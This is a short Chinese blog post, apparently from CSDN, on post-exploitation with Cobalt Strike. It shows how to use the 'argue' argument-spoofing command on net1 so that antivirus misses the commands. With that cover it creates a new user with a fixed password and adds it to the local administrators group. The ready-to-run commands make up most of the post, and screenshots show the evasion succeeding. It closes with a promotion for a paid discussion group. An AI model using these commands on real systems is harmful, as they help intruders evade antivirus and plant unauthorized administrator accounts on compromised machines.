> 在获取了对方主机CobaltStrike Beacon后，需要执行一些敏感的操作(如创建用户等)。但是目标主机有AV，执行敏感命令会直接报毒等，这时我们可以使用Cobaltstrike自带的argue参数污染来执行敏感操作。

### 使用argue参数污染创建新用户并加入管理员组中

**使用前提**：administrator 或 system权限。

执行创建新用户命令，360报毒

![](https://img-blog.csdnimg.cn/20200620225159689.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

使用argus参数污染 net1 

```
#参数污染net1      
argue net1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx       
#查看污染的参数      
argue
```


![](https://img-blog.csdnimg.cn/20200620225310521.png)

用污染的 net1 创建用户，发现创建成功，360也不报毒

```
#用污染的net1执行敏感操作      
execute net1 user test root123 /add      
execute net1 localgroup administrators test /add
```


![](https://img-blog.csdnimg.cn/20200620225150550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/2020062022552939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

文章知识点与官方知识档案匹配，可进一步学习相关知识

[CS入门技能树](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[Linux入门](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[初识Linux](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)11176 人正在系统学习中